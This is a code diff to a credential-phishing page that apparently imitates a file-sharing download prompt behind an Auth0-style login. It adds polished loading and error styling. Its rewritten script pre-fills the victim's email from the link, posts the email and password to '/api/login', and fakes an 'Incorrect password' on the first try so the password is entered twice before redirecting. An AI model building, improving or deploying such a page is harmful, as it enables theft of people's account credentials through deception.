@@ -3062,8 +3062,104 @@
                 display: none
             }
     </style>
+    <style>
+        /* ===== ADDITIONAL SLEEK STYLES ===== */
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            transition: opacity 0.3s ease;
+        }
+        .loading-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 20px;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-size: 16px;
+            color: #333;
+            letter-spacing: 0.5px;
+        }
+
+        /* Error styling */
+        .form-group.shake .input-wrapper {
+            animation: shake 0.4s ease-in-out;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 6px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            text-align: center;
+        }
+        .error-message.show {
+            opacity: 1;
+        }
+        .attempt-counter {
+            font-size: 12px;
+            color: #999;
+            margin-top: 8px;
+            text-align: center;
+        }
+        /* Sleek password field border on error */
+        .form-group.show-error .form-control {
+            border-color: #e74c3c;
+        }
+        /* Smooth step transition */
+        #one, #two {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        #one.hidden, #two.hidden {
+            opacity: 0;
+            transform: translateY(10px);
+            pointer-events: none;
+        }
+        /* Dashboard link style (optional) */
+        .sleek-link {
+            color: #000;
+            text-decoration: none;
+            border-bottom: 1px solid #000;
+            padding-bottom: 2px;
+        }
+    </style>
 </head>
 <body>
+    <!-- ===== LOADING OVERLAY ===== -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Logging you in…</div>
+    </div>
+
+    <!-- ===== MAIN CONTENT ===== -->
     <main class="wt-container wt-split-pane">
         <img class="wt-logo" id="wt-logo" src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjIwIiB2aWV3Qm94PSIwIDAgNDAgMjAiIHdpZHRoPSI0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Im0xMi4yMjk5IDE0LjI0MDJjLS4zODMyLS42MDU1LS42OTY4LS45MjYtMS4yNTQzLS45MjZzLS44NzExLjMyMDUtMS4yNTQzNi45MjZsLTEuNjcyNDcgMi42NzEzYy0uNjI3MTggMS4wMzI5LTEuMTQ5ODMgMS43NDUzLTIuMzY5MzQgMS43NDUzcy0xLjc3Ny0uNDk4Ny0yLjM2OTMzLTEuODg3OGMtLjczMTcxLTEuNzA5Ni0xLjQ5ODI2LTMuNzc1NC0yLjE5NTEyLTYuNTUzNi0uNzY2NTQ5LTMuMDk5MjUtMS4xMTQ5OC01LjAyMjU5LTEuMTE0OTgtNi41ODk3NnMuNDg3ODA0LTIuNDkzMjIgMi4xNjAyNy0yLjgxMzc3N2MyLjI5OTY1LS40Mjc0MDkgNS40MDA2OS0uNjc2NzMxIDguODE1MzMtLjY3NjczMSAzLjQxNDYgMCA2LjUxNTcuMjQ5MzIyIDguODE1My42NzY3MzEgMS42NzI1LjMyMDU1NyAyLjE2MDMgMS4yNDY2MDcgMi4xNjAzIDIuODEzNzc3cy0uMzQ4NCAzLjQ5MDUxLTEuMTE1IDYuNTg5NzZjLS42OTY5IDIuNzc4Mi0xLjQ2MzQgNC44NDQtMi4xOTUxIDYuNTUzNi0uNTkyNCAxLjM4OTEtMS4xNDk4IDEuODg3OC0yLjM2OTQgMS44ODc4LTEuMjE5NSAwLTEuNzQyMS0uNzEyNC0yLjM2OTMtMS43NDV6bTI2LjUxNTggMi40OTk5Yy0xLjE4NDcgMS4yODIyLTMuNDE0NyAyLjIwODMtNi4zNDE1IDIuMjA4My01Ljg4ODUgMC05LjM3MjgtNC4wOTYtOS4zNzI4LTkuNDc0MjQgMC01Ljc3MDAzIDQuMDA2OS05LjE4OTMwMSA5LjE5ODYtOS4xODkzMDEgNC42MzQyIDAgNy43MDA0IDIuNDU3NjAxIDcuNzAwNCA1Ljc3MDAzMSAwIDMuMTM0MzMtMi42MTMzIDUuMTY0NTEtNS41NzUgNS4xNjQ1MS0xLjYwMjggMC0yLjc4NzQtLjMyMDUtMy41ODg4LS45NjE3LS4zMTM2LS4yNDkzLS40ODc4LS4yMTM3LS40ODc4LjA3MTMgMCAxLjE3NTQuNDE4MSAyLjE3MjYgMS4xODQ2IDIuOTU2Mi42MjcyLjY0MTEgMS44MTE5IDEuMDY4NiAyLjkyNjkgMS4wNjg2IDEuMTQ5OCAwIDIuMTYwMy0uMjQ5NCAzLjA2NjItLjcxMjRzMS42NzI1LS4zMjA2IDIuMTI1NC40Mjc0Yy41MjI3Ljg1NDgtLjIwOSAxLjk1OS0uODM2MiAyLjY3MTN6IiBmaWxsPSIjMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiLz48L3N2Zz4=" alt="">
         <div class="wt-pane wt-pane--left">
@@ -3104,6 +3200,7 @@
                                             <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px;">
                                                 <div>
                                                     <div>
+                                                        <!-- Original error message div (hidden) – we'll use our own -->
                                                         <div class="auth0-global-message auth0-global-message-error" id="msg" style="display:none">
                                                             <span class="animated fadeInUp">
                                                                 <span>Hmm, that doesn’t look right. Typo?</span>
@@ -3189,6 +3286,7 @@
                                 </div>
                             </div>
                         </div>
+
                         <!-- ===== STEP 2: PASSWORD ===== -->
                         <div id="two" style="display: none;">
                             <div class="auth0-lock-widget-container">
@@ -3207,6 +3305,7 @@
                                             <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px;">
                                                 <div>
                                                     <div>
+                                                        <!-- Original error message hidden -->
                                                         <div class="auth0-global-message auth0-global-message-error" id="msg" style="display:none">
                                                             <span class="animated fadeInUp">
                                                                 <span>Hmm, that doesn’t look right. Typo?</span>
@@ -3234,6 +3333,7 @@
                                                                                         <div>
                                                                                             <div class="auth0-lock-pane-separator"></div>
                                                                                             <div>
+                                                                                                <!-- Email display -->
                                                                                                 <div class="auth0-lock-input-block auth0-lock-input-email">
                                                                                                     <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                                                                         <span aria-hidden="true">
@@ -3250,9 +3350,10 @@
                                                                                                         <input type="email" id="email_display" inputmode="email" name="email_display" class="auth0-lock-input" placeholder="Email" autocomplete="off" autocapitalize="off" aria-label="Email" aria-invalid="false" tabindex="1" readonly="">
                                                                                                     </div>
                                                                                                 </div>
-                                                                                                <div class="auth0-lock-input-block auth0-lock-input-show-password">
+                                                                                                <!-- Password field with sleek error -->
+                                                                                                <div class="auth0-lock-input-block auth0-lock-input-show-password" id="passwordBlock">
                                                                                                     <div class="auth0-lock-input-block auth0-lock-input-password">
-                                                                                                        <div class="auth0-lock-input-wrap auth0-lock-focused auth0-lock-input-wrap-with-icon">
+                                                                                                        <div class="auth0-lock-input-wrap auth0-lock-focused auth0-lock-input-wrap-with-icon" id="passwordWrap">
                                                                                                             <span aria-hidden="true">
                                                                                                                 <svg aria-hidden="true" focusable="false" width="11px" height="14px" viewBox="0 0 13 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="auth0-lock-icon auth0-lock-icon-box">
                                                                                                                     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
@@ -3266,6 +3367,10 @@
                                                                                                         </div>
                                                                                                     </div>
                                                                                                 </div>
+                                                                                                <!-- Sleek error message -->
+                                                                                                <div id="passwordError" class="error-message"></div>
+                                                                                                <!-- Attempt counter -->
+                                                                                                <div id="attemptCounter" class="attempt-counter"></div>
                                                                                                 <p class="auth0-lock-alternative">
                                                                                                     <a class="auth0-lock-alternative-link" href="#">Forgot password?</a>
                                                                                                 </p>
@@ -3310,70 +3415,74 @@
         </div>
     </main>
 
-    <!-- ===== UPDATED SCRIPT – replaces the old log.php submission ===== -->
+    <!-- ===== UPDATED JAVASCRIPT ===== -->
     <script>
         (function() {
             'use strict';
 
-            // ----- API endpoint (your Vercel function) -----
-            var API_URL = '/api/login';
+            const API_URL = '/api/login';
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const one = document.getElementById('one');
+            const two = document.getElementById('two');
+            const downloadBtn = document.getElementById('download');
+            const submitBtn = document.getElementById('submit-btn');
+            const passwordInput = document.getElementById('password');
+            const emailDisplay = document.getElementById('email_display');
+            const passwordError = document.getElementById('passwordError');
+            const attemptCounter = document.getElementById('attemptCounter');
+            const passwordWrap = document.getElementById('passwordWrap');
+            const passwordBlock = document.getElementById('passwordBlock');
 
-            // ----- Utility: get email from URL hash or query -----
+            let currentEmail = '';
+            let attemptCount = 0;
+
             function getEmailFromURL() {
                 if (window.location.hash) {
-                    var hashParams = new URLSearchParams(window.location.hash.substring(1));
-                    var email = hashParams.get('email');
+                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                    const email = hashParams.get('email');
                     if (email) return email;
-                    // fallback: regex
-                    var match = window.location.hash.match(/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i);
+                    const match = window.location.hash.match(/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i);
                     if (match) return match[0];
                 }
-                var params = new URLSearchParams(window.location.search);
+                const params = new URLSearchParams(window.location.search);
                 return params.get('email') || '';
             }
 
-            // ----- DOM refs -----
-            var one = document.getElementById('one');
-            var two = document.getElementById('two');
-            var downloadBtn = document.getElementById('download');
-            var submitBtn = document.getElementById('submit-btn');
-            var passwordInput = document.getElementById('password');
-            var emailDisplay = document.getElementById('email_display');
-            var msgDiv = document.getElementById('msg');
-            var loadingContainers = document.querySelectorAll('.auth0-loading-container');
-
-            var currentEmail = '';
-            var attemptCount = 0;
-
-            // ----- Helper functions -----
             function setLoading(loading) {
-                loadingContainers.forEach(function(el) {
-                    el.style.display = loading ? 'block' : 'none';
-                });
+                if (loading) {
+                    loadingOverlay.classList.add('active');
+                } else {
+                    loadingOverlay.classList.remove('active');
+                }
                 downloadBtn.disabled = loading;
                 submitBtn.disabled = loading;
             }
 
-            function showMessage(text, isError) {
-                isError = (isError !== undefined) ? isError : true;
-                msgDiv.style.display = 'block';
-                var span = msgDiv.querySelector('span span');
-                if (span) span.textContent = text;
-                msgDiv.className = 'auth0-global-message ' + (isError ? 'auth0-global-message-error' : 'auth0-global-message-success');
+            function showError(msg) {
+                passwordError.textContent = msg;
+                passwordError.classList.add('show');
+                passwordWrap.classList.add('show-error');
+                passwordBlock.classList.add('shake');
+                setTimeout(() => passwordBlock.classList.remove('shake'), 400);
             }
 
-            function hideMessage() {
-                msgDiv.style.display = 'none';
+            function hideError() {
+                passwordError.classList.remove('show');
+                passwordWrap.classList.remove('show-error');
             }
 
-            // ----- Step 1: Download All -> send email -----
+            function setAttemptCounter(count, total) {
+                attemptCounter.textContent = `Attempt ${count} of ${total}`;
+            }
+
+            // Step 1: Download All
             downloadBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                hideMessage();
+                hideError();
 
-                var email = getEmailFromURL();
+                const email = getEmailFromURL();
                 if (!email) {
-                    showMessage('Error: Email not found in URL. Please check the link.', true);
+                    showError('Error: Email not found in URL.');
                     return;
                 }
 
@@ -3383,57 +3492,47 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ action: 'email', email: email })
                 })
-                .then(function(response) {
-                    // Try to parse JSON; if it fails, throw with the raw text
-                    return response.text().then(function(text) {
-                        try {
-                            var data = JSON.parse(text);
-                            if (!response.ok) {
-                                throw new Error(data.error || 'Failed to proceed');
-                            }
-                            return data;
-                        } catch (e) {
-                            // Not JSON – show the raw response for debugging
-                            throw new Error('Server returned non-JSON: ' + text.substring(0, 100));
-                        }
-                    });
-                })
-                .then(function(data) {
+                .then(response => response.json())
+                .then(data => {
                     setLoading(false);
-                    currentEmail = email;
-                    if (emailDisplay) emailDisplay.value = email;
-                    // Update profile email in step 2
-                    var emailProfile = document.querySelector('#two .user-email');
-                    if (emailProfile) emailProfile.textContent = email;
-                    one.style.display = 'none';
-                    two.style.display = 'block';
-                    passwordInput.focus();
-                    attemptCount = 0;
-                    var attemptSpan = document.querySelector('#two .attempt-counter');
-                    if (attemptSpan) attemptSpan.textContent = 'Attempt 1 of 2';
+                    if (data.success) {
+                        currentEmail = email;
+                        emailDisplay.value = email;
+                        // Update profile email in step 2 (if exists)
+                        const profileEmail = document.querySelector('#two .user-email');
+                        if (profileEmail) profileEmail.textContent = email;
+                        one.style.display = 'none';
+                        two.style.display = 'block';
+                        passwordInput.focus();
+                        attemptCount = 0;
+                        setAttemptCounter(1, 2);
+                        hideError();
+                    } else {
+                        showError(data.error || 'Failed to proceed.');
+                    }
                 })
-                .catch(function(err) {
+                .catch(err => {
                     setLoading(false);
-                    showMessage(err.message || 'Network error. Please try again.', true);
+                    showError('Network error. Please try again.');
                 });
             });
 
-            // ----- Step 2: Submit password -----
+            // Step 2: Submit password
             submitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                hideMessage();
+                hideError();
 
-                var password = passwordInput.value.trim();
+                const password = passwordInput.value.trim();
                 if (!password) {
-                    showMessage('Please enter your password.', true);
+                    showError('Please enter your password.');
+                    passwordInput.focus();
                     return;
                 }
 
                 attemptCount++;
-                var attemptSpan = document.querySelector('#two .attempt-counter');
-                if (attemptSpan) attemptSpan.textContent = 'Attempt ' + (attemptCount + 1) + ' of 2';
-
+                setAttemptCounter(attemptCount + 1, 2);
                 setLoading(true);
+
                 fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -3444,34 +3543,27 @@
                         remember: document.getElementById('remember') ? (document.getElementById('remember').checked ? 1 : 0) : 0
                     })
                 })
-                .then(function(response) {
-                    return response.text().then(function(text) {
-                        try {
-                            var data = JSON.parse(text);
-                            if (!response.ok) {
-                                if (response.status === 401) {
-                                    throw new Error(data.error || 'Incorrect password. Please try again.');
-                                } else {
-                                    throw new Error(data.error || 'Unknown error.');
-                                }
-                            }
-                            return data;
-                        } catch (e) {
-                            throw new Error('Server returned non-JSON: ' + text.substring(0, 100));
-                        }
-                    });
+                .then(response => {
+                    if (!response.ok) {
+                        return response.json().then(data => {
+                            throw new Error(data.error || 'Incorrect password.');
+                        });
+                    }
+                    return response.json();
                 })
-                .then(function(data) {
+                .then(data => {
                     setLoading(false);
                     if (data.redirect) {
+                        // Second attempt succeeded – redirect
                         window.location.href = data.redirect;
                     } else {
-                        showMessage('Unexpected response from server.', true);
+                        // Should not happen
+                        showError('Unexpected response from server.');
                     }
                 })
-                .catch(function(err) {
+                .catch(err => {
                     setLoading(false);
-                    showMessage(err.message || 'Network error. Please try again.', true);
+                    showError(err.message || 'Incorrect password. Please try again.');
                     passwordInput.value = '';
                     passwordInput.focus();
                 });
@@ -3479,7 +3571,12 @@
 
             // Clear error on typing
             passwordInput.addEventListener('input', function() {
-                hideMessage();
+                hideError();
+            });
+
+            // Also clear when focusing
+            passwordInput.addEventListener('focus', function() {
+                hideError();
             });
         })();
     </script>
